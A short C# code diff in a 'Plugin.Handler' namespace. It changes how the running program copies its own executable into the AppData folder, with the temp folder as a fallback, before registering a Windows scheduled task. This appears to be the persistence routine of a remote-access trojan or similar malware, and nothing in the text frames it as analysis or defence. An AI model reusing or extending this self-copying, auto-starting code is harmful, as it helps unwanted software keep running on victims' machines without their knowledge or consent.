@@ -24,13 +24,16 @@ namespace Plugin.Handler
             {
                 Process processes = Process.GetCurrentProcess();
                 string name = processes.ProcessName + ".exe";
-                string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-                if (Directory.GetAccessControl(path).AreAccessRulesProtected == true)
+                try 
                 {
-                    path = Environment.ExpandEnvironmentVariables("%temp%");
-                }
-                string filepath = Path.Combine(path, name);
-                File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                    string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                } 
+                catch
+                {
+                    string filepath = Path.Combine(Path.GetTempPath(), name);
+                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
+                }                
                 TaskService ts = new TaskService();
                 TaskDefinition td = ts.NewTask();
                 td.RegistrationInfo.Description = Description;
